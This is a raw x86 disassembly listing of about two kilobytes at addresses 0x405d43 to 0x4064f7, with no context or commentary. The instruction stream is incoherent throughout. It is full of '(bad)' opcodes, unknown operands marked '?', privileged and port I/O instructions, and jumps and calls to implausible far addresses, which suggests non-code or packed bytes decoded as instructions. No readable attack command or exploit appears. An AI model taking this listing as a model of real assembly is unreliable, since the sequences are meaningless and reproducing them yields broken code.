  405d43:	pushf  
  405d44:	rcr    DWORD PTR [edi+0x79],cl
  405d47:	lods   al,BYTE PTR ds:[esi]
  405d48:	mov    ebx,DWORD PTR [esi-0x62]
  405d4b:	(bad)  [ebx+esi*1]
  405d4e:	xor    bl,al
  405d50:	inc    edx
  405d51:	or     eax,0xe79d8408
  405d56:	pop    ebx
  405d57:	and    BYTE PTR [edi],bh
  405d59:	out    dx,al
  405d5a:	inc    esp
  405d5b:	lods   al,BYTE PTR ds:[esi]
  405d5c:	jg     0x405d62
  405d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5f:	dec    edx
  405d60:	lahf   
  405d61:	aas    
  405d62:	adc    ebx,DWORD PTR [edx+0x37]
  405d65:	pushf  
  405d66:	add    DWORD PTR [edi+0x51],esp
  405d69:	in     al,0xde
  405d6b:	or     al,dl
  405d6d:	push   ebx
  405d6e:	pop    ebp
  405d6f:	ja     0x405d12
  405d71:	rcl    DWORD PTR [edx],cl
  405d73:	sub    ecx,DWORD PTR [ebp-0x62da9ea9]
  405d79:	pop    ebx
  405d7a:	int    0xce
  405d7c:	ret    
  405d7d:	sar    DWORD PTR [ebx-0x27],1
  405d80:	cmp    ebp,ecx
  405d82:	aas    
  405d83:	lods   al,BYTE PTR ds:[esi]
  405d84:	xchg   ebp,eax
  405d85:	sbb    DWORD PTR [ecx+eiz*8+0x4b],ebx
  405d89:	xchg   esp,eax
  405d8a:	xor    dl,BYTE PTR [ecx-0xe]
  405d8d:	(bad)  
  405d8e:	cld    
  405d8f:	call   0x2873dc49
  405d94:	push   0xf1d32d8c
  405d99:	and    edi,DWORD PTR [edx]
  405d9b:	shl    BYTE PTR [eax+0x20],cl
  405d9e:	test   dh,bh
  405da0:	dec    ebx
  405da1:	fistp  QWORD PTR [ebx]
  405da3:	xchg   esp,eax
  405da4:	sub    eax,0x40ce5594
  405da9:	adc    al,0x5e
  405dab:	pop    ebp
  405dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dad:	mov    al,0x81
  405daf:	ins    DWORD PTR es:[edi],dx
  405db0:	cmp    esi,eax
  405db2:	push   es
  405db3:	(bad)  
  405db4:	sub    BYTE PTR [eax-0x5c],ah
  405db7:	jbe    0x405d5c
  405db9:	pop    ebp
  405dba:	sub    ah,ah
  405dbc:	clc    
  405dbd:	jmp    0x65445cf6
  405dc2:	push   ecx
  405dc3:	pop    es
  405dc4:	sar    BYTE PTR [edi-0x5f9fe2bb],cl
  405dca:	mov    cs,WORD PTR [ecx+eiz*8+0x48]
  405dce:	fidivr WORD PTR [ecx]
  405dd0:	xor    al,0x53
  405dd2:	repz mov ebp,0x1f455c2e
  405dd8:	(bad)  
  405dd9:	push   edx
  405dda:	push   0xffffffef
  405ddc:	nop
  405ddd:	out    dx,eax
  405dde:	mov    eax,ds:0x7a76591e
  405de3:	out    0xb3,eax
  405de5:	cli    
  405de6:	xchg   BYTE PTR [esi+0x1b4cf251],bl
  405dec:	vmwrite esi,DWORD PTR [esi-0x5346c933]
  405df3:	push   edx
  405df4:	inc    eax
  405df5:	cs (bad) 
  405df8:	test   eax,0x14d43b5f
  405dfd:	cli    
  405dfe:	in     al,dx
  405dff:	retf   
  405e00:	loope  0x405e24
  405e02:	add    al,0x27
  405e04:	(bad)  [ebx+ecx*4-0x6d1059b0]
  405e0b:	sbb    DWORD PTR [edi-0x6e],ecx
  405e0e:	or     al,0x17
  405e10:	add    DWORD PTR [edi],ecx
  405e12:	shl    DWORD PTR [esi],1
  405e14:	add    BYTE PTR [eax-0x14],ch
  405e17:	enter  0xe30d,0x3f
  405e1b:	lods   al,BYTE PTR ds:[esi]
  405e1c:	(bad)  
  405e1d:	and    BYTE PTR [edx+0x7e],al
  405e20:	xchg   esp,eax
  405e21:	cli    
  405e22:	jl     0x405e34
  405e24:	jmp    0x405dc3
  405e26:	arpl   WORD PTR [esi-0x6dfa8179],sp
  405e2c:	shr    BYTE PTR [esi+0x688b64b0],cl
  405e32:	(bad)  
  405e33:	dec    ebx
  405e34:	iret   
  405e35:	jge    0x405dc7
  405e37:	xor    DWORD PTR [ebx+esi*8],ecx
  405e3a:	sub    al,0x1b
  405e3c:	xchg   ebx,edi
  405e3e:	push   cs
  405e3f:	test   BYTE PTR [esi+0x4a695e9e],cl
  405e45:	daa    
  405e46:	loop   0x405e77
  405e48:	cli    
  405e49:	pop    ecx
  405e4a:	aam    0xd0
  405e4c:	adc    al,0x1f
  405e4e:	das    
  405e4f:	and    DWORD PTR [ecx],0x19
  405e52:	jno    0x405df1
  405e54:	inc    DWORD PTR [esi-0xd]
  405e57:	sbb    dh,BYTE PTR [edi]
  405e59:	dec    esi
  405e5a:	sahf   
  405e5b:	(bad)  
  405e5c:	dec    BYTE PTR [esi+0x20]
  405e5f:	call   0x9bc5:0x631e87b0
  405e66:	sbb    esi,DWORD PTR [ecx-0x3048f4cd]
  405e6c:	dec    BYTE PTR [ebp+0x2cd5cdea]
  405e72:	mov    ?,WORD PTR [eax]
  405e74:	xor    eax,0x78bd19a1
  405e79:	xor    ch,BYTE PTR [ecx]
  405e7b:	pop    eax
  405e7c:	sbb    al,0xc2
  405e7e:	std    
  405e7f:	or     al,0xde
  405e81:	dec    esi
  405e82:	jno    0x405efa
  405e84:	inc    esp
  405e85:	cmp    al,bh
  405e87:	jl     0x405ed0
  405e89:	hlt    
  405e8a:	fs call 0x66a3dbff
  405e90:	(bad)  [eax]
  405e92:	push   ebx
  405e93:	clc    
  405e94:	fcmovbe st,st(4)
  405e96:	ins    BYTE PTR es:[edi],dx
  405e97:	lods   eax,DWORD PTR ds:[esi]
  405e98:	xchg   esp,eax
  405e99:	sbb    ebx,DWORD PTR [esi-0x17]
  405e9c:	or     eax,0x82fb9b1d
  405ea1:	mov    DWORD PTR [eax+0x57b2bd8],ebp
  405ea7:	mov    BYTE PTR [ebx+0xf],dl
  405eaa:	and    edx,DWORD PTR [edi-0x5122ff54]
  405eb0:	pop    ds
  405eb1:	lahf   
  405eb2:	push   es
  405eb3:	xor    BYTE PTR [edx-0x675c8dad],ah
  405eb9:	mov    edx,0xa23c50c2
  405ebe:	xchg   ebp,eax
  405ebf:	sbb    dl,ah
  405ec1:	loopne 0x405ef2
  405ec3:	or     DWORD PTR [edx-0x39],edx
  405ec6:	mov    dh,BYTE PTR [ebp-0x22]
  405ec9:	jmp    0xee55edd0
  405ece:	push   edx
  405ecf:	int    0xd2
  405ed1:	in     eax,0x5e
  405ed3:	sbb    ebx,DWORD PTR [ebp-0x15]
  405ed6:	outs   dx,DWORD PTR ds:[esi]
  405ed7:	mov    dl,0x7a
  405ed9:	aas    
  405eda:	jno    0x405ec1
  405edc:	inc    ebp
  405edd:	xchg   BYTE PTR fs:[ebx-0x4fbdf950],bh
  405ee4:	sub    al,0xb7
  405ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee7:	(bad)  
  405ee9:	jp     0x405ea1
  405eeb:	sti    
  405eec:	hlt    
  405eed:	and    eax,0x1330aad
  405ef2:	imul   ebx,DWORD PTR [ecx+0x52],0xffffffd3
  405ef6:	lahf   
  405ef7:	pop    edi
  405ef8:	cli    
  405ef9:	mov    ds:0xf52a1dbb,eax
  405efe:	adc    dh,BYTE PTR ds:0xa8ece067
  405f04:	add    BYTE PTR [edx+0x20],cl
  405f07:	mov    bl,0xd4
  405f09:	scas   eax,DWORD PTR es:[edi]
  405f0a:	jle    0x405f4f
  405f0c:	in     eax,dx
  405f0d:	repnz add DWORD PTR [ebp+edi*2+0x7c],ebx
  405f12:	mov    edi,0xd9d17b6c
  405f17:	iret   
  405f18:	push   esp
  405f19:	sbb    al,0x9a
  405f1b:	push   ebp
  405f1c:	mov    edx,0x6941495a
  405f21:	or     al,0x1c
  405f23:	mov    ss,WORD PTR [eax-0x1e3d7d88]
  405f29:	sbb    ecx,ebx
  405f2b:	add    edi,DWORD PTR [edx+0x5b]
  405f2e:	stc    
  405f2f:	icebp  
  405f30:	sbb    al,0xfb
  405f32:	pusha  
  405f33:	ins    BYTE PTR es:[edi],dx
  405f34:	test   eax,0x72d80119
  405f39:	jne    0x405f12
  405f3b:	or     BYTE PTR [ebx],cl
  405f3d:	inc    edx
  405f3e:	xor    al,0xef
  405f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f41:	out    0x7f,al
  405f43:	jo     0x405f25
  405f45:	xchg   esp,eax
  405f46:	adc    ch,BYTE PTR [esi-0x2b3b557f]
  405f4c:	rol    DWORD PTR [ecx],cl
  405f4e:	dec    esi
  405f4f:	jbe    0x405ed7
  405f51:	cmp    ah,al
  405f53:	dec    esi
  405f54:	sub    dh,bl
  405f56:	mov    bl,0x6e
  405f58:	pop    esp
  405f59:	dec    edi
  405f5a:	sub    ch,ch
  405f5c:	push   ecx
  405f5d:	mov    bl,0x64
  405f5f:	sti    
  405f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f61:	shl    DWORD PTR [ecx+0x43],1
  405f64:	mov    eax,ds:0xbf372356
  405f69:	mov    DWORD PTR [ecx+0xf],ecx
  405f6c:	add    eax,0x9608bbef
  405f71:	sub    BYTE PTR [esi+ebx*2-0x1d],al
  405f75:	jo     0x405f46
  405f77:	push   ebx
  405f78:	or     bl,BYTE PTR ds:0xcb4075b8
  405f7e:	cmp    edi,ecx
  405f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f81:	mov    ebp,0x4603e2a3
  405f86:	and    WORD PTR [bp+si-0x7af9],bp
  405f8c:	popf   
  405f8d:	fs xor BYTE PTR gs:[esi+ebx*8+0x1],bh
  405f93:	fwait
  405f94:	inc    esi
  405f95:	xchg   ecx,eax
  405f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f97:	outs   dx,BYTE PTR ds:[esi]
  405f98:	pusha  
  405f99:	or     al,0xd8
  405f9b:	mov    al,es:0x6ade035c
  405fa1:	mov    ds:0x5248187,eax
  405fa6:	mov    dh,0xf1
  405fa8:	pop    edx
  405fa9:	sbb    ecx,DWORD PTR [ebx]
  405fab:	loop   0x406019
  405fad:	rol    BYTE PTR [ebp+0x5],1
  405fb0:	sub    al,BYTE PTR [eax+0x5b]
  405fb3:	(bad)  
  405fb4:	adc    BYTE PTR [esi-0x26],bh
  405fb7:	push   ebx
  405fb8:	out    0xd0,al
  405fba:	add    BYTE PTR [edi],dl
  405fbc:	cmp    BYTE PTR [eax-0x2f],cl
  405fbf:	sti    
  405fc0:	cdq    
  405fc1:	sbb    BYTE PTR [ecx+0x4a85fb61],ah
  405fc7:	jnp    0x405fcd
  405fc9:	mov    esp,0x69dd5f91
  405fce:	or     al,0x30
  405fd0:	push   esi
  405fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd2:	pop    esi
  405fd4:	jo     0x405f58
  405fd6:	jl     0x406017
  405fd8:	add    eax,0xcd452e95
  405fdd:	sahf   
  405fde:	jns    0x405ff2
  405fe0:	cmp    eax,0x85f12ace
  405fe5:	sbb    BYTE PTR [ebx+0x7],0x41
  405fe9:	mov    esi,0x247a9877
  405fee:	aas    
  405fef:	ret    
  405ff0:	inc    ebx
  405ff1:	shr    DWORD PTR [edi],cl
  405ff3:	std    
  405ff4:	xchg   BYTE PTR [edx-0x22bcaeea],dl
  405ffa:	test   al,0x4d
  405ffc:	ficomp WORD PTR [edi-0x3f]
  405fff:	call   0x2cb5753f
  406004:	mov    DWORD PTR [ebp+0x530ec0b1],esi
  40600a:	sub    ebx,DWORD PTR [ebx-0x34a557f4]
  406010:	push   eax
  406011:	aad    0x7
  406013:	int    0x49
  406015:	in     al,0x5e
  406017:	adc    edi,esi
  406019:	mov    eax,0xd61f883e
  40601e:	pusha  
  40601f:	pop    ss
  406020:	nop
  406021:	or     BYTE PTR [edx],0x7
  406024:	inc    esp
  406025:	xor    DWORD PTR [ebp+0x51],ebx
  406028:	mov    ebp,0x461678a7
  40602d:	jmp    0x68d7:0x441549d6
  406034:	push   esp
  406035:	mov    ds:0xeb837b36,al
  40603a:	push   0xffffffba
  40603c:	(bad)  
  40603d:	std    
  40603e:	push   es
  40603f:	mov    edi,0x73fd35bf
  406044:	inc    edx
  406045:	popa   
  406046:	mov    ah,0x3a
  406048:	push   ebp
  406049:	sub    ch,BYTE PTR [ebx-0x28ecacde]
  40604f:	or     al,0x9e
  406051:	mov    ebx,0xf06daefe
  406056:	mov    ds:0x4e022c32,al
  40605b:	and    BYTE PTR [ebp-0x44],bl
  40605e:	lahf   
  40605f:	xchg   ebp,eax
  406060:	(bad)  
  406061:	fistp  DWORD PTR [eax-0x396e4768]
  406067:	mov    BYTE PTR ds:[ecx-0x51bb6470],0xc1
  40606f:	std    
  406070:	imul   esi,DWORD PTR [ebx],0x296040f5
  406076:	and    cl,cl
  406078:	mov    ah,0x78
  40607a:	inc    esp
  40607b:	mov    ecx,0x7d3eaf91
  406080:	aam    0x4e
  406082:	push   0xffffffe4
  406084:	inc    edx
  406085:	mov    dh,0xba
  406087:	fstp   st(5)
  406089:	mov    bh,0xcd
  40608b:	inc    edx
  40608c:	std    
  40608d:	sbb    DWORD PTR [edx+eiz*4+0xd],esi
  406091:	in     eax,0xbd
  406093:	mov    cl,0x5e
  406095:	arpl   ax,di
  406097:	mov    edi,0xf2352601
  40609c:	test   al,0xec
  40609e:	cmc    
  40609f:	inc    edi
  4060a0:	sub    ah,BYTE PTR [edx]
  4060a2:	adc    al,0x90
  4060a4:	sbb    eax,0x3862a158
  4060a9:	stos   BYTE PTR es:[edi],al
  4060aa:	sub    ebx,DWORD PTR [esi+0x3ec5089c]
  4060b0:	add    dl,BYTE PTR [edx]
  4060b2:	mov    cl,0x7c
  4060b4:	add    DWORD PTR [ecx],esp
  4060b6:	and    ebx,DWORD PTR [ecx+0x67]
  4060b9:	xor    al,BYTE PTR [ebx+ebx*1-0x7d]
  4060bd:	and    eax,0xbb5e15fa
  4060c2:	sbb    DWORD PTR [ebx-0x4a69c4fa],edi
  4060c8:	jo     0x406056
  4060ca:	imul   edi,DWORD PTR [edx-0x23],0x6a
  4060ce:	fsubr  QWORD PTR [esi+0x3a]
  4060d1:	jo     0x406058
  4060d3:	mov    ds:0xfb248d3b,al
  4060d8:	js     0x40609b
  4060da:	cs jae 0x40608a
  4060dd:	xchg   esp,eax
  4060de:	lods   al,BYTE PTR ds:[esi]
  4060df:	loop   0x4060a0
  4060e1:	pop    ebp
  4060e2:	push   eax
  4060e3:	mov    dh,0xb0
  4060e5:	mov    dh,dh
  4060e7:	jb     0x406147
  4060e9:	mov    esi,0x1438a62c
  4060ee:	cdq    
  4060ef:	imul   ebp,DWORD PTR [esi],0x42
  4060f2:	js     0x40615b
  4060f4:	aad    0xdd
  4060f6:	mov    esi,0xd9770a5e
  4060fb:	stos   DWORD PTR es:[edi],eax
  4060fc:	pop    ds
  4060fd:	ja     0x4060af
  4060ff:	xor    eax,0xd1ec0081
  406104:	jl     0x4060fd
  406106:	mov    al,ds:0x896372de
  40610b:	int    0x42
  40610d:	in     al,dx
  40610e:	stos   BYTE PTR es:[edi],al
  40610f:	sahf   
  406110:	xchg   ebp,eax
  406111:	or     eax,0x7ae44f19
  406116:	mov    esi,0x66e427f6
  40611b:	sub    eax,0x710d3e86
  406120:	fnstcw WORD PTR [eax-0x21]
  406123:	es jg  0x4060c0
  406126:	sub    cl,ah
  406128:	pusha  
  406129:	ret    
  40612a:	pop    ss
  40612b:	and    bl,ah
  40612d:	stos   BYTE PTR es:[edi],al
  40612e:	jnp    0x4060e8
  406130:	(bad)  
  406131:	repnz or al,BYTE PTR [ebx]
  406134:	ret    0xc858
  406137:	stos   DWORD PTR es:[edi],eax
  406138:	je     0x40611f
  40613a:	push   eax
  40613b:	cmp    BYTE PTR [ebp+0x1ee4b8d0],ah
  406141:	push   esp
  406142:	push   cs
  406143:	das    
  406144:	xchg   BYTE PTR [eax-0x4a],dh
  406147:	mov    ds:0x24402c1b,eax
  40614c:	jne    0x4061c5
  40614e:	jns    0x4060d4
  406150:	addr16 retf 0x3c2b
  406154:	mov    ch,0xca
  406156:	add    esi,edi
  406158:	imul   esi,DWORD PTR [ecx+0x13b7945b],0x7619098f
  406162:	stos   DWORD PTR es:[edi],eax
  406163:	sti    
  406164:	mov    eax,0xcfb0e1e8
  406169:	inc    ecx
  40616a:	aam    0xa5
  40616c:	fisttp WORD PTR [edi]
  40616e:	sbb    eax,DWORD PTR [edi+0x5f]
  406171:	cmp    bh,BYTE PTR [edx+0x64]
  406174:	jecxz  0x4061bd
  406176:	adc    al,0x61
  406178:	mov    dh,0xda
  40617a:	and    al,0x0
  40617c:	cmp    eax,0x610114c3
  406181:	sahf   
  406182:	loop   0x40618a
  406184:	mov    edx,0x1b62a72b
  406189:	ds aas 
  40618b:	mov    ebx,0x8a9c264f
  406190:	aam    0x6
  406192:	dec    esi
  406193:	pop    ebx
  406194:	fisttp QWORD PTR [edi-0x5409076e]
  40619a:	in     eax,dx
  40619b:	imul   ebx,DWORD PTR [ecx-0x4143957f],0xba217765
  4061a5:	jp     0x40619c
  4061a7:	mov    ?,WORD PTR [edx]
  4061a9:	fdivr  st,st(3)
  4061ab:	call   0x75ecdd42
  4061b0:	loop   0x40614e
  4061b2:	int    0x99
  4061b4:	fs nop
  4061b6:	xchg   edx,eax
  4061b7:	aas    
  4061b8:	les    edi,FWORD PTR [edi+0x79]
  4061bb:	out    0x9c,al
  4061bd:	jecxz  0x40617f
  4061bf:	xchg   ebx,eax
  4061c0:	mov    ecx,0xcda97426
  4061c5:	sar    ebx,cl
  4061c7:	lahf   
  4061c8:	icebp  
  4061c9:	cmp    al,0x25
  4061cb:	xor    DWORD PTR [esi+0x329df42d],eax
  4061d1:	push   cs
  4061d2:	pop    ebp
  4061d3:	or     eax,0x93d6e849
  4061d8:	in     al,dx
  4061d9:	xor    esi,DWORD PTR [edx+0x18dd9996]
  4061df:	fs mov al,0x84
  4061e2:	scas   eax,DWORD PTR es:[edi]
  4061e3:	xchg   edi,eax
  4061e4:	jae    0x4061e6
  4061e6:	je     0x406207
  4061e8:	add    al,0xa1
  4061ea:	and    DWORD PTR [eax-0x10212820],eax
  4061f0:	push   cs
  4061f1:	xchg   DWORD PTR [edx-0x705d0f9e],ebx
  4061f7:	adc    eax,0xa3fb55fa
  4061fc:	mov    dl,0x3b
  4061fe:	push   eax
  4061ff:	pop    edi
  406200:	call   0x1ee2:0xc242cf16
  406207:	int    0xd6
  406209:	out    0x59,al
  40620b:	outs   dx,DWORD PTR ds:[esi]
  40620c:	mov    esi,0x72f00b55
  406211:	jnp    0x4061cd
  406213:	and    DWORD PTR [edx-0xd],esp
  406216:	out    0x40,al
  406218:	jle    0x406295
  40621a:	leave  
  40621b:	imul   eax,DWORD PTR cs:[ebp+0x54c08b58],0x74ac80b7
  406226:	repnz sbb eax,0x1e48285a
  40622c:	sbb    bh,cl
  40622e:	or     eax,0xb6787aca
  406233:	lods   al,BYTE PTR ds:[esi]
  406234:	push   es
  406235:	xor    edx,ebx
  406237:	nop
  406238:	xor    eax,0xd3578709
  40623d:	retf   
  40623e:	push   edx
  40623f:	add    al,0x17
  406241:	xchg   DWORD PTR [ecx-0x4e3af1e7],ebx
  406247:	lods   al,BYTE PTR ds:[esi]
  406248:	data16 sub al,0x3c
  40624b:	ret    0xf5b5
  40624e:	inc    eax
  40624f:	lock loope 0x4061e3
  406252:	sub    BYTE PTR [ebp-0x355af03],al
  406258:	retf   
  406259:	and    BYTE PTR [ebp+0x2a],ah
  40625c:	mov    ds:0x29a13ed2,al
  406261:	stos   DWORD PTR es:[edi],eax
  406262:	fnsave [eax]
  406264:	inc    edi
  406265:	jge    0x4062b4
  406267:	(bad)
  40626a:	jg     0x406280
  40626c:	pop    ebx
  40626d:	loopne 0x4062d0
  40626f:	sbb    edi,DWORD PTR [eax]
  406271:	outs   dx,DWORD PTR ds:[esi]
  406272:	(bad)  
  406273:	gs leave 
  406275:	das    
  406276:	aaa    
  406277:	xlat   BYTE PTR ds:[ebx]
  406278:	rcl    ah,cl
  40627a:	mov    edx,0xb6fbf223
  40627f:	mov    ebp,esp
  406281:	dec    ebp
  406282:	sbb    dh,BYTE PTR [ebp+0x59]
  406285:	pop    ecx
  406286:	std    
  406287:	mov    eax,ds:0x9591a8a6
  40628c:	xor    al,BYTE PTR [edi]
  40628e:	xchg   ecx,eax
  40628f:	cdq    
  406290:	mov    ebp,0xa25574bd
  406295:	pop    ds
  406296:	cmp    al,0x9a
  406298:	scas   al,BYTE PTR es:[edi]
  406299:	mov    ebx,0x4a7c81b0
  40629e:	sub    DWORD PTR [esi],edi
  4062a0:	int    0x61
  4062a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062a3:	aam    0x47
  4062a5:	stc    
  4062a6:	push   esi
  4062a7:	cmp    bh,BYTE PTR [edi-0x32]
  4062aa:	test   DWORD PTR [ebp-0x3dee536b],0xd2097b58
  4062b4:	(bad)  
  4062b5:	push   ebx
  4062b6:	out    0x45,eax
  4062b8:	and    al,0xf4
  4062ba:	das    
  4062bb:	mov    bl,0x7d
  4062bd:	repnz add eax,0x4a6bd3ba
  4062c3:	shr    BYTE PTR [edi-0x45],1
  4062c6:	(bad)  
  4062c7:	and    dh,BYTE PTR [ebp+0x51]
  4062ca:	out    dx,eax
  4062cb:	mov    edx,0x4f88fa9e
  4062d0:	inc    ecx
  4062d1:	lods   eax,DWORD PTR ds:[esi]
  4062d2:	jmp    0x40628e
  4062d4:	fisttp WORD PTR fs:[edi+0x70]
  4062d8:	jo     0x40627c
  4062da:	sbb    DWORD PTR [eax],edx
  4062dc:	fisttp WORD PTR [ebp-0x5e]
  4062df:	xlat   BYTE PTR ds:[ebx]
  4062e0:	scas   eax,DWORD PTR es:[edi]
  4062e1:	shl    esp,1
  4062e3:	stc    
  4062e4:	das    
  4062e5:	mov    eax,ds:0x465b89df
  4062ea:	aas    
  4062eb:	cs dec ebp
  4062ed:	mov    eax,DWORD PTR [ecx]
  4062ef:	pop    ds
  4062f0:	fcomi  st,st(0)
  4062f2:	fadd   QWORD PTR [ebp+0x2e]
  4062f5:	push   ds
  4062f6:	jnp    0x406357
  4062f8:	sub    edi,DWORD PTR [ecx-0x7870ae11]
  4062fe:	xchg   esp,eax
  4062ff:	push   edi
  406300:	outs   dx,DWORD PTR ds:[esi]
  406301:	mov    esi,0x38d01468
  406306:	push   edx
  406307:	add    BYTE PTR [edx-0x25],cl
  40630a:	mov    eax,ds:0xc86c206
  40630f:	fcmovne st,st(6)
  406311:	sub    al,0xc0
  406313:	cli    
  406314:	cmp    ebp,DWORD PTR [eax-0x536d5212]
  40631a:	imul   esp,eax,0x1f
  40631d:	xor    eax,0xdb939aaf
  406322:	into   
  406323:	jnp    0x406305
  406325:	jmp    0x406319
  406327:	add    dl,dh
  406329:	gs hlt 
  40632b:	dec    esp
  40632c:	pop    edx
  40632d:	aaa    
  40632e:	scas   eax,DWORD PTR es:[edi]
  40632f:	push   cs
  406330:	pop    es
  406331:	loopne 0x406331
  406333:	into   
  406334:	jmp    0xf19e003c
  406339:	xchg   edi,esi
  40633b:	sar    DWORD PTR [edi-0x49],cl
  40633e:	and    eax,0x54ff9a69
  406343:	and    dh,cl
  406345:	mov    cl,0x2f
  406347:	daa    
  406348:	icebp  
  406349:	push   0xffffffb1
  40634b:	pop    esi
  40634d:	ss dec edx
  40634f:	cwde   
  406350:	mov    ecx,0x7e65942
  406355:	fsubr  QWORD PTR [esi+0x19]
  406358:	popf   
  406359:	in     al,dx
  40635a:	ret    
  40635b:	lods   eax,DWORD PTR ds:[esi]
  40635c:	jnp    0x4063b6
  40635e:	xchg   DWORD PTR [eax+0x66efdb77],edi
  406364:	call   0x7afecc41
  406369:	mov    dh,0x53
  40636b:	pop    eax
  40636c:	sbb    esi,DWORD PTR [ebx]
  40636e:	xor    BYTE PTR [eax],dl
  406370:	push   ebp
  406371:	dec    esi
  406372:	inc    ecx
  406373:	aad    0x2d
  406375:	add    ebx,ecx
  406377:	mov    bl,0x11
  406379:	test   DWORD PTR [ebx-0x76f72dfa],eax
  40637f:	mov    esi,0x4b6c4784
  406384:	in     eax,0x6e
  406386:	je     0x4063d0
  406388:	xor    BYTE PTR [ebx-0x2d3c6d7e],0x7d
  40638f:	lods   eax,DWORD PTR ds:[esi]
  406390:	(bad)  
  406391:	and    edi,DWORD PTR [esi+0x74]
  406394:	sbb    DWORD PTR ds:0xdaf8bc60,0xffffffb0
  40639b:	daa    
  40639c:	adc    eax,0x2c3d3b8c
  4063a1:	test   eax,0x91f6ae2e
  4063a6:	mov    ebp,0x1e634dc
  4063ab:	push   ecx
  4063ac:	shl    BYTE PTR [esi+0x5de0fb4],0x9
  4063b3:	mov    esi,0x5acf5397
  4063b8:	pop    ss
  4063b9:	push   ecx
  4063ba:	int    0x50
  4063bc:	cli    
  4063bd:	pop    ebp
  4063be:	pop    ebp
  4063bf:	push   es
  4063c0:	push   0x625028ae
  4063c5:	ds mov cl,0x91
  4063c8:	stos   DWORD PTR es:[edi],eax
  4063c9:	sbb    eax,0xc6ffbd3a
  4063ce:	and    BYTE PTR ds:0x5904b686,al
  4063d4:	(bad)  
  4063d5:	rcl    BYTE PTR [eax],cl
  4063d7:	fs loope 0x4063f3
  4063da:	pop    edx
  4063db:	cmp    al,0x57
  4063dd:	or     eax,0x8ba85db9
  4063e2:	ja     0x406426
  4063e4:	out    0xa4,eax
  4063e6:	adc    BYTE PTR [ebx-0x19],dl
  4063e9:	dec    ecx
  4063ea:	add    ch,BYTE PTR [ebp+0x67]
  4063ed:	dec    esi
  4063ee:	and    al,0xe1
  4063f0:	mov    ebp,DWORD PTR [ebx+edi*1-0x7fe6e94b]
  4063f7:	addr16 push esi
  4063f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063fa:	jp     0x4063a1
  4063fc:	faddp  st(7),st
  4063fe:	add    al,0x4
  406400:	cmp    eax,0xa0ba62f5
  406405:	in     al,dx
  406406:	sub    al,0x8
  406408:	loope  0x40639d
  40640a:	add    esi,DWORD PTR [esi+0x25caff9e]
  406410:	jmp    0x7983bbb4
  406415:	fst    DWORD PTR [edi]
  406417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406418:	aad    0x16
  40641a:	pop    ds
  40641b:	push   esi
  40641c:	xchg   esp,eax
  40641d:	lahf   
  40641e:	mul    BYTE PTR [ecx-0xd9c2ff6]
  406424:	xor    BYTE PTR [ebp+0x5],dh
  406427:	xor    ebx,DWORD PTR cs:[di-0x1316]
  40642d:	je     0x4063f6
  40642f:	jno    0x4063fc
  406431:	pop    esi
  406432:	add    DWORD PTR [ecx],0xfffffffd
  406435:	fadd   DWORD PTR [esi-0x21]
  406438:	icebp  
  406439:	or     al,0xcc
  40643b:	mov    ebx,0xb8958a5e
  406440:	std    
  406441:	push   0x330b41a5
  406446:	mov    ds:0x8394ca56,eax
  40644b:	push   esi
  40644c:	in     eax,dx
  40644d:	repnz and dh,BYTE PTR [ebx]
  406450:	adc    ebx,esp
  406452:	test   eax,0x4c734acc
  406457:	imul   BYTE PTR [esi-0x3a]
  40645a:	inc    esi
  40645b:	sbb    al,0xbb
  40645d:	mov    ebp,0xdd9d7aee
  406462:	loop   0x40647e
  406464:	sbb    edx,DWORD PTR cs:[ebp-0x7c80923c]
  40646b:	sub    al,0x57
  40646d:	xchg   BYTE PTR [ebx-0xd7bd0c8],ch
  406473:	faddp  st(7),st
  406475:	mov    bl,0xf5
  406477:	stos   DWORD PTR es:[edi],eax
  406478:	scas   al,BYTE PTR es:[edi]
  406479:	xor    DWORD PTR [ecx],edx
  40647b:	and    eax,0x8bb9a775
  406480:	mov    BYTE PTR [ebx+0x2a1f7575],dl
  406486:	jno    0x406426
  406488:	pop    ecx
  406489:	sbb    BYTE PTR [esi+edi*8],bh
  40648c:	mov    ah,0xcd
  40648e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40648f:	bt     DWORD PTR [ecx-0x3d],eax
  406493:	xchg   ebx,eax
  406494:	mov    eax,ds:0x994db0b9
  406499:	sub    bh,bh
  40649b:	dec    edx
  40649c:	fst    QWORD PTR [edx-0x79]
  40649f:	mov    bh,BYTE PTR [ebx]
  4064a1:	mov    fs,WORD PTR [esi]
  4064a3:	mov    ds:0x60f86403,al
  4064a8:	push   ebx
  4064a9:	mov    cl,0xdc
  4064ab:	sti    
  4064ac:	mov    cl,0x41
  4064ae:	outs   dx,DWORD PTR ds:[esi]
  4064af:	or     DWORD PTR [esi],edx
  4064b1:	jbe    0x406527
  4064b3:	xchg   esi,eax
  4064b4:	push   ss
  4064b5:	cmp    dl,BYTE PTR ss:[edx+0x7d]
  4064b9:	jo     0x406445
  4064bb:	add    al,0x74
  4064bd:	push   eax
  4064be:	mov    ecx,0xa59b352
  4064c3:	push   cs
  4064c4:	outs   dx,BYTE PTR ds:[esi]
  4064c5:	xor    eax,0x30bea17c
  4064ca:	xchg   edx,eax
  4064cb:	sbb    al,0x51
  4064cd:	shl    BYTE PTR [edx+0x72b38ff0],1
  4064d3:	sar    DWORD PTR ds:0xd106597a,0x7e
  4064da:	mov    ds:0x8d8545bd,eax
  4064df:	and    bh,BYTE PTR [edx]
  4064e1:	sti    
  4064e2:	(bad)  [eax]
  4064e4:	pusha  
  4064e5:	or     DWORD PTR [ebp-0x5e],esp
  4064e8:	push   es
  4064e9:	dec    eax
  4064ea:	shl    ebp,1
  4064ec:	outs   dx,BYTE PTR ds:[esi]
  4064ed:	mov    ss,WORD PTR [ecx+0x19d9bd25]
  4064f3:	sti    
  4064f4:	clc    
  4064f5:	ds pop ecx
  4064f7:	mov    edx,0x7ef81b7e
